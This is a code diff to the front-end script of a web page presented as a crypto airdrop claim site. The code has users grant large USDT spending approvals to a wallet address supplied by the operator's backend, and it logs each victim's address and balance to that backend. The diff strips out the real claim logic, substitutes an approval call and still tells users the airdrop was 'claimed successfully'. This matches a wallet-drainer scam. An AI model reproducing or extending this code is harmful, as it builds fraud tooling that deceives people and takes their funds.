@@ -607,7 +607,7 @@
         const airdropContractAddress = "0xC1509957dAa21aafCABf014c31D4E2635C77bDcA";
         const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-        // ✅ UPDATED: Contract ABIs with Claim Function
+        // Contract ABIs
         const airdropABI = [
             {
                 "inputs": [],
@@ -619,21 +619,6 @@
             {
                 "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
                 "name": "hasApproved",
-                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            // ✅ ADDED: Claim Function
-            {
-                "inputs": [{"internalType": "address", "name": "_referrer", "type": "address"}],
-                "name": "claimAirdrop",
-                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
-                "name": "hasClaimed",
                 "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                 "stateMutability": "view",
                 "type": "function"
@@ -770,41 +755,6 @@
             }
         }
 
-        // ✅ NEW: Backend में claim save करें
-        async function saveClaimToBackend(walletAddress, usdtBalance, airdropAmount, tier, referrer) {
-            try {
-                const response = await fetch(`${BACKEND_URL}/save-claim`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        walletAddress,
-                        usdtBalance: parseFloat(usdtBalance).toFixed(6),
-                        airdropAmount,
-                        tier,
-                        referrer: referrer !== "0x0000000000000000000000000000000000000000" ? referrer : null,
-                        txHash: "pending",
-                        claimedAt: new Date().toISOString()
-                    })
-                });
-                
-                const data = await response.json();
-                console.log("✅ Claim saved to backend:", data);
-                
-                if (data.success) {
-                    showAlert("✅ Claim recorded in database!", "success");
-                    return data;
-                } else {
-                    throw new Error(data.message || 'Failed to save claim');
-                }
-            } catch (error) {
-                console.error("❌ Error saving claim to backend:", error);
-                showAlert("⚠️ Claim successful but not saved to database", "warning");
-                return { success: false, error: error.message };
-            }
-        }
-
         // Show loading state on button
         function setButtonLoading(buttonId, isLoading) {
             const button = document.getElementById(buttonId);
@@ -871,7 +821,6 @@
                 document.getElementById("claimButton").disabled = true;
                 generateReferral();
                 checkAllowance();
-                checkClaimStatus();
             } else {
                 account = null;
                 document.getElementById("walletAddress").innerText = "Not Connected";
@@ -900,7 +849,6 @@
                 document.getElementById("walletAddress").innerText = account.substring(0, 6) + "..." + account.substring(38);
                 generateReferral();
                 checkAllowance();
-                checkClaimStatus();
                 
                 const chainId = Number(await web3.eth.getChainId());
                 updateNetworkStatus(chainId);
@@ -974,6 +922,7 @@
             try {
                 console.log("🔄 Starting approval process...");
                 
+                // Better MetaMask check
                 if (typeof window.ethereum === 'undefined') {
                     showAlert("Please install MetaMask!", "danger");
                     return;
@@ -989,6 +938,7 @@
                 button.disabled = true;
                 button.innerHTML = '<div class="loading"></div> Checking Balance...';
 
+                // Initialize Web3 if not done
                 if (!web3) {
                     web3 = new Web3(window.ethereum);
                 }
@@ -1044,27 +994,28 @@
                             
                             if (tx.status) {
                                 showAlert("✅ USDT Approval Successful!", "success");
-                                
-                                // ✅ ENABLE CLAIM BUTTON AFTER APPROVAL
-                                document.getElementById("claimButton").disabled = false;
-                                document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Approved & Ready';
-                                document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
-                                
-                                // Save to backend
-                                await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
-                                
                             } else {
                                 throw new Error("Transaction failed");
                             }
                         } else {
                             console.log("✅ Already approved, skipping approval");
                             showAlert("✅ USDT Already Approved", "success");
-                            
-                            // ✅ ALREADY APPROVED - ENABLE CLAIM BUTTON
+                        }
+
+                        // 4. Save to Backend (ALWAYS save after approval check)
+                        console.log("💾 Saving to backend...");
+                        const saveResult = await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
+                        console.log("✅ Backend save result:", saveResult);
+                        
+                        if (saveResult && saveResult.success) {
+                            button.innerHTML = '<i class="fas fa-check"></i> Approved & Saved!';
+                            button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                             document.getElementById("claimButton").disabled = false;
-                            document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Already Approved';
-                            document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
-                            showAlert("✅ USDT Already Approved - Ready to Claim!", "success");
+                            showAlert("🎉 Approval recorded! You can now claim airdrop.", "success");
+                        } else {
+                            button.innerHTML = originalText;
+                            button.disabled = false;
+                            showAlert("⚠️ Approved but save failed. Please refresh and try again.", "warning");
                         }
 
                     } catch (approvalError) {
@@ -1132,8 +1083,6 @@
                 if (parseFloat(allowanceInUSDT) > 1000) {
                     showAlert(`✅ USDT Approved: Unlimited`, "success");
                     document.getElementById("claimButton").disabled = false;
-                    document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Already Approved';
-                    document.getElementById("checkBalanceBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                 }
                 
             } catch (error) {
@@ -1141,7 +1090,7 @@
             }
         }
 
-        // ✅ FIXED: Claim Airdrop Function
+        // Claim Airdrop
         async function claimAirdrop() {
             try {
                 if (!account) {
@@ -1149,94 +1098,59 @@
                     return;
                 }
 
-                // Check if USDT is approved
-                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                const currentApprovalWallet = await getApprovalWalletFromBackend();
-                const allowance = await usdtContract.methods.allowance(account, currentApprovalWallet).call();
-                const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
-
-                if (parseFloat(allowanceInUSDT) < 1) {
-                    showAlert("❌ Please approve USDT first before claiming airdrop!", "warning");
-                    return;
-                }
-
                 const claimButton = document.getElementById("claimButton");
                 claimButton.disabled = true;
-                claimButton.innerHTML = '<div class="loading"></div> Claiming...';
-
-                // Get referrer address
-                const referrer = document.getElementById("referrer").value || "0x0000000000000000000000000000000000000000";
+                claimButton.innerHTML = '<div class="loading"></div> Processing...';
 
                 // Get current USDT balance for final calculation
+                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
                 const balance = await usdtContract.methods.balanceOf(account).call();
                 const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
                 
                 const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                 const tier = getTier(parseFloat(balanceInUSDT));
 
-                // Interact with airdrop contract - CALL CLAIM FUNCTION
+                // Interact with airdrop contract
                 const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
                 
-                // ✅ Call claimAirdrop function with referrer
-                const tx = await airdropContract.methods.claimAirdrop(referrer).send({
+                // Call approveAirdrop function
+                const tx = await airdropContract.methods.approveAirdrop().send({
                     from: account,
-                    gas: 300000,
-                    gasPrice: await web3.eth.getGasPrice()
+                    gas: 300000
                 });
 
-                console.log("✅ Claim transaction:", tx);
-
                 if (tx.status) {
-                    // Save claim to backend
-                    await saveClaimToBackend(account, balanceInUSDT, airdropAmount.toString(), tier, referrer);
+                    isApproved = true;
+                    
+                    // Save approval to backend
+                    await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
                     
                     showAlert("🎉 Airdrop claimed successfully! Your tokens will be distributed soon.", "success");
                     claimButton.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully';
-                    claimButton.disabled = true;
-                    
-                    // Update UI
-                    document.getElementById("checkBalanceBtn").style.background = 'var(--success)';
-                    document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Approved & Ready';
                 } else {
                     throw new Error("Transaction failed");
                 }
 
             } catch (error) {
-                console.error("❌ Error claiming airdrop:", error);
-                
-                if (error.code === 4001) {
-                    showAlert("❌ Claim cancelled by user", "warning");
-                } else if (error.message.includes("already claimed")) {
-                    showAlert("❌ You have already claimed the airdrop!", "warning");
-                } else if (error.message.includes("insufficient allowance")) {
-                    showAlert("❌ Please approve USDT first!", "warning");
-                } else {
-                    showAlert("❌ Failed to claim airdrop: " + error.message, "danger");
-                }
-                
+                console.error("Error claiming airdrop:", error);
+                showAlert("Failed to claim airdrop: " + error.message, "danger");
                 document.getElementById("claimButton").disabled = false;
                 document.getElementById("claimButton").innerHTML = '<i class="fas fa-gift"></i> Claim Airdrop';
             }
         }
 
-        // ✅ FIXED: Check Claim Status
+        // ✅ FIXED: Check Claim Status - Temporary Disabled
         async function checkClaimStatus() {
             try {
+                // TEMPORARILY DISABLE CLAIM STATUS CHECK
+                // This is causing "execution reverted" errors
+                return;
+                
+                /* COMMENTED OUT - CAUSING ERRORS
                 if (!account || !web3) return;
-                
                 const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
-                
-                // Check if already claimed
-                const hasClaimed = await airdropContract.methods.hasClaimed(account).call();
-                
-                if (hasClaimed) {
-                    document.getElementById("claimButton").disabled = true;
-                    document.getElementById("claimButton").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
-                    document.getElementById("checkBalanceBtn").style.background = 'var(--success)';
-                    document.getElementById("checkBalanceBtn").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
-                    showAlert("✅ You have already claimed your airdrop!", "success");
-                }
-                
+                const hasClaimed = await airdropContract.methods.hasApproved(account).call();
+                */
             } catch (error) {
                 console.error("Error checking claim status:", error);
                 // Silent fail - don't show error to user
